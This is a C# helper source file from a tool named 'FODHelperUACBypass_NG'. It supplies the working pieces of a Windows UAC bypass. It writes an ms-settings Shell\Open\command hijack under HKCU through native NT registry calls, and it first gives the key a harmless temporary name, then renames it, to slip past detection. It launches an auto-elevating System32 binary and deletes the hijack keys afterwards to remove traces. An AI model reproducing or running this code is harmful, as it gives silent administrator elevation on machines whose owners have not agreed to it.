using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace FODHelperUACBypass_NG
{
    public static class Helpers
    {
        #region UNICODE_STRING Utilities

        public static unsafe Native.UNICODE_STRING CreateUnicodeString(string str)
        {
            if (string.IsNullOrEmpty(str))
            {
                return new Native.UNICODE_STRING
                {
                    Length = 0,
                    MaximumLength = 0,
                    Buffer = IntPtr.Zero
                };
            }

            byte[] bytes = Encoding.Unicode.GetBytes(str);
            IntPtr buffer = Marshal.AllocHGlobal(bytes.Length + 2); // +2 for null terminator
            Marshal.Copy(bytes, 0, buffer, bytes.Length);
            Marshal.WriteInt16(buffer, bytes.Length, 0); // Null terminator

            return new Native.UNICODE_STRING
            {
                Length = (ushort)bytes.Length,
                MaximumLength = (ushort)(bytes.Length + 2),
                Buffer = buffer
            };
        }

        public static void FreeUnicodeString(ref Native.UNICODE_STRING unicodeString)
        {
            if (unicodeString.Buffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(unicodeString.Buffer);
                unicodeString.Buffer = IntPtr.Zero;
                unicodeString.Length = 0;
                unicodeString.MaximumLength = 0;
            }
        }

        public static Native.OBJECT_ATTRIBUTES InitializeObjectAttributes(
            ref Native.UNICODE_STRING objectName,
            uint attributes,
            IntPtr rootDirectory = default(IntPtr))
        {
            IntPtr objectNamePtr = Marshal.AllocHGlobal(Marshal.SizeOf<Native.UNICODE_STRING>());
            Marshal.StructureToPtr(objectName, objectNamePtr, false);

            return new Native.OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf<Native.OBJECT_ATTRIBUTES>(),
                RootDirectory = rootDirectory,
                ObjectName = objectNamePtr,
                Attributes = attributes,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };
        }

        public static void FreeObjectAttributes(ref Native.OBJECT_ATTRIBUTES objectAttributes)
        {
            if (objectAttributes.ObjectName != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(objectAttributes.ObjectName);
                objectAttributes.ObjectName = IntPtr.Zero;
            }
        }

        #endregion

        #region Registry Utilities

        public static string GetCurrentUserRegistryPath(string subKey)
        {
            // Get current user SID
            string sid = WindowsIdentity.GetCurrent().User.Value;
            
            // Build NT registry path format: \Registry\User\<SID>\<subKey>
            string registryPath = $"\\Registry\\User\\{sid}\\{subKey}";
            
            return registryPath;
        }

        public static bool CreateRegistryKey(string keyPath, out IntPtr keyHandle)
        {
            return CreateRegistryKey(keyPath, out keyHandle, out uint statusCode);
        }

        public static bool CreateRegistryKey(string keyPath, out IntPtr keyHandle, out uint statusCode)
        {
            keyHandle = IntPtr.Zero;
            statusCode = 0;

            try
            {
                // First, try to create parent keys recursively
                string[] parts = keyPath.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                string currentPath = "";
                
                // Create each parent key
                for (int i = 0; i < parts.Length - 1; i++)
                {
                    if (i == 0)
                        currentPath = parts[i];
                    else
                        currentPath += "\\" + parts[i];
                    
                    // Try to create/open this parent key
                    string ntPath = GetCurrentUserRegistryPath(currentPath);
                    Native.UNICODE_STRING keyName = CreateUnicodeString(ntPath);
                    Native.OBJECT_ATTRIBUTES objAttr = InitializeObjectAttributes(
                        ref keyName,
                        Native.OBJ_CASE_INSENSITIVE | Native.OBJ_OPENIF);
                    
                    uint status = Native.NtCreateKey(
                        out IntPtr tempHandle,
                        Native.KEY_ALL_ACCESS,
                        ref objAttr,
                        0,
                        IntPtr.Zero,
                        Native.REG_OPTION_NON_VOLATILE,
                        out uint disposition);
                    
                    FreeObjectAttributes(ref objAttr);
                    FreeUnicodeString(ref keyName);
                    
                    if (status == Native.STATUS_SUCCESS)
                    {
                        Native.NtClose(tempHandle);
                    }
                    // If it fails, continue anyway - the key might already exist
                }

                // Now create the final key
                string finalNtPath = GetCurrentUserRegistryPath(keyPath);
                Native.UNICODE_STRING finalKeyName = CreateUnicodeString(finalNtPath);
                Native.OBJECT_ATTRIBUTES finalObjAttr = InitializeObjectAttributes(
                    ref finalKeyName,
                    Native.OBJ_CASE_INSENSITIVE | Native.OBJ_OPENIF);

                statusCode = Native.NtCreateKey(
                    out keyHandle,
                    Native.KEY_ALL_ACCESS,
                    ref finalObjAttr,
                    0,
                    IntPtr.Zero,
                    Native.REG_OPTION_NON_VOLATILE,
                    out uint finalDisposition);

                FreeObjectAttributes(ref finalObjAttr);
                FreeUnicodeString(ref finalKeyName);

                return statusCode == Native.STATUS_SUCCESS;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception in CreateRegistryKey: {ex.Message}");
                return false;
            }
        }

        public static bool SetRegistryValue(IntPtr keyHandle, string valueName, string value)
        {
            try
            {
                Native.UNICODE_STRING valueNameUs = CreateUnicodeString(valueName);
                
                // Convert string value to bytes
                byte[] valueBytes = Encoding.Unicode.GetBytes(value);
                IntPtr valueBuffer = Marshal.AllocHGlobal(valueBytes.Length + 2);
                Marshal.Copy(valueBytes, 0, valueBuffer, valueBytes.Length);
                Marshal.WriteInt16(valueBuffer, valueBytes.Length, 0); // Null terminator

                // Set the value
                uint status = Native.NtSetValueKey(
                    keyHandle,
                    ref valueNameUs,
                    0,
                    Native.REG_SZ,
                    valueBuffer,
                    (uint)(valueBytes.Length + 2));

                // Cleanup
                Marshal.FreeHGlobal(valueBuffer);
                FreeUnicodeString(ref valueNameUs);

                return status == Native.STATUS_SUCCESS;
            }
            catch
            {
                return false;
            }
        }

        // Win32 RegRenameKey API
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int RegRenameKey(
            IntPtr hKey,
            string lpSubKeyName,
            string lpNewKeyName);

        // Win32 RegOpenKeyEx API for compatibility with RegRenameKey
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int RegOpenKeyEx(
            IntPtr hKey,
            string lpSubKey,
            uint ulOptions,
            uint samDesired,
            out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegCloseKey(IntPtr hKey);

        // Predefined registry key for HKEY_CURRENT_USER
        private static readonly IntPtr HKEY_CURRENT_USER = new IntPtr(unchecked((int)0x80000001));

        /// <summary>
        /// Renames a registry key using Win32 RegRenameKey API.
        /// This creates the key with a benign name, sets values, then atomically renames it.
        /// </summary>
        /// <param name="keyPath">Full path to the key to rename (e.g., "Software\\Classes\\TempApp123")</param>
        /// <param name="newName">New name for the key (e.g., "ms-settings")</param>
        /// <returns>True if successful, false otherwise</returns>
        public static bool RenameRegistryKey(string keyPath, string newName)
        {
            IntPtr parentHandle = IntPtr.Zero;
            
            try
            {
                // Parse the key path to get parent and old key name
                // For Software\Classes\TempAppXXX -> parent: Software\Classes, oldName: TempAppXXX
                int lastBackslash = keyPath.LastIndexOf('\\');
                if (lastBackslash == -1)
                {
                    Console.WriteLine("[!] Invalid key path format");
                    return false;
                }

                string parentPath = keyPath.Substring(0, lastBackslash);
                string oldKeyName = keyPath.Substring(lastBackslash + 1);

                Console.WriteLine($"[*] Opening parent key: {parentPath}");
                Console.WriteLine($"[*] Will rename: {oldKeyName} -> {newName}");

                // Open the parent key using Win32 API
                // RegRenameKey requires KEY_CREATE_SUB_KEY access to parent
                int result = RegOpenKeyEx(
                    HKEY_CURRENT_USER,
                    parentPath,
                    0, // ulOptions
                    Native.KEY_WRITE | Native.KEY_CREATE_SUB_KEY, // samDesired
                    out parentHandle);

                if (result != 0) // ERROR_SUCCESS = 0
                {
                    int lastError = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[!] RegOpenKeyEx failed: result={result}, LastError={lastError}");
                    return false;
                }

                Console.WriteLine("[+] Parent key opened successfully");

                // Use RegRenameKey to atomically rename the subkey
                result = RegRenameKey(parentHandle, oldKeyName, newName);

                if (result != 0)
                {
                    int lastError = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[!] RegRenameKey failed: result={result}, LastError={lastError}");
                    Console.WriteLine($"[!] This typically means:");
                    Console.WriteLine($"[!]   - Target key '{newName}' already exists (ERROR_ALREADY_EXISTS)");
                    Console.WriteLine($"[!]   - Insufficient permissions (ERROR_ACCESS_DENIED)");
                    Console.WriteLine($"[!]   - Source key '{oldKeyName}' not found");
                    return false;
                }

                Console.WriteLine($"[+] RegRenameKey succeeded: {oldKeyName} -> {newName}");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception in RenameRegistryKey: {ex.Message}");
                Console.WriteLine($"[!] Stack: {ex.StackTrace}");
                return false;
            }
            finally
            {
                // Always close the parent handle if it was opened
                if (parentHandle != IntPtr.Zero)
                {
                    RegCloseKey(parentHandle);
                }
            }
        }

        public static bool DeleteRegistryKey(string keyPath)
        {
            try
            {
                // For the fixed structure: Software\Classes\ms-settings\Shell\Open\command
                // Delete from deepest to shallowest

                // Extract base path (ms-settings)
                // keyPath should be: Software\Classes\ms-settings
                string basePath = keyPath;
                
                string[] pathsToDelete = new string[]
                {
                    basePath + @"\Shell\Open\command",    // Deepest
                    basePath + @"\Shell\Open",
                    basePath + @"\Shell",
                    basePath                              // Base (ms-settings)
                };

                // Delete each path in order
                foreach (string path in pathsToDelete)
                {
                    try
                    {
                        string ntPath = GetCurrentUserRegistryPath(path);
                        Native.UNICODE_STRING keyName = CreateUnicodeString(ntPath);

                        Native.OBJECT_ATTRIBUTES objAttr = InitializeObjectAttributes(
                            ref keyName,
                            Native.OBJ_CASE_INSENSITIVE);

                        uint status = Native.NtOpenKey(
                            out IntPtr keyHandle,
                            Native.KEY_ALL_ACCESS,
                            ref objAttr);

                        FreeObjectAttributes(ref objAttr);
                        FreeUnicodeString(ref keyName);

                        if (status == Native.STATUS_SUCCESS)
                        {
                            Native.NtDeleteKey(keyHandle);
                            Native.NtClose(keyHandle);
                        }
                    }
                    catch
                    {
                        // Ignore individual failures, continue to next path
                    }
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region Process Utilities

        [DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct SHELLEXECUTEINFO
        {
            public int cbSize;
            public uint fMask;
            public IntPtr hwnd;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpVerb;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpFile;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpParameters;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpDirectory;
            public int nShow;
            public IntPtr hInstApp;
            public IntPtr lpIDList;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpClass;
            public IntPtr hkeyClass;
            public uint dwHotKey;
            public IntPtr hIconOrMonitor;
            public IntPtr hProcess;
        }

        private const uint SEE_MASK_NOCLOSEPROCESS = 0x00000040;

        public static bool StartProcess(string executablePath)
        {
            return StartProcess(executablePath, out string errorMsg);
        }

        public static bool StartProcess(string executablePath, out string errorMsg)
        {
            errorMsg = null;
            try
            {
                // If it's just a filename, try to find it in System32
                string fullPath = executablePath;
                if (!System.IO.Path.IsPathRooted(executablePath))
                {
                    string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    fullPath = System.IO.Path.Combine(system32, executablePath);
                }

                if (!System.IO.File.Exists(fullPath))
                {
                    errorMsg = $"File not found: {fullPath}";
                    return false;
                }

                // Use ShellExecuteEx to handle auto-elevation properly
                SHELLEXECUTEINFO sei = new SHELLEXECUTEINFO();
                sei.cbSize = Marshal.SizeOf(sei);
                sei.fMask = SEE_MASK_NOCLOSEPROCESS;
                sei.lpFile = fullPath;
                sei.lpVerb = "open"; // Use "open" to allow auto-elevation
                sei.nShow = 1; // SW_SHOWNORMAL

                bool success = ShellExecuteEx(ref sei);

                if (success && sei.hProcess != IntPtr.Zero)
                {
                    // Close process handle (we don't need to wait)
                    Native.NtClose(sei.hProcess);
                }
                else if (!success)
                {
                    errorMsg = $"ShellExecuteEx failed with error {Marshal.GetLastWin32Error()}";
                }

                return success;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        #endregion

        #region Sleep Utilities

        public static void Sleep(int milliseconds)
        {
            // Convert milliseconds to 100-nanosecond intervals (negative for relative time)
            long interval = -10000L * milliseconds;
            
            Native.LARGE_INTEGER delayInterval = new Native.LARGE_INTEGER
            {
                QuadPart = interval
            };

            Native.NtDelayExecution(false, ref delayInterval);
        }

        #endregion

        #region Error Handling

        public static string GetNtStatusMessage(uint status)
        {
            switch (status)
            {
                case Native.STATUS_SUCCESS:
                    return "Success";
                case 0xC0000034:
                    return "Object name not found";
                case 0xC0000022:
                    return "Access denied";
                case 0xC0000035:
                    return "Object name collision";
                default:
                    return $"NTSTATUS: 0x{status:X8}";
            }
        }

        #endregion
    }
}
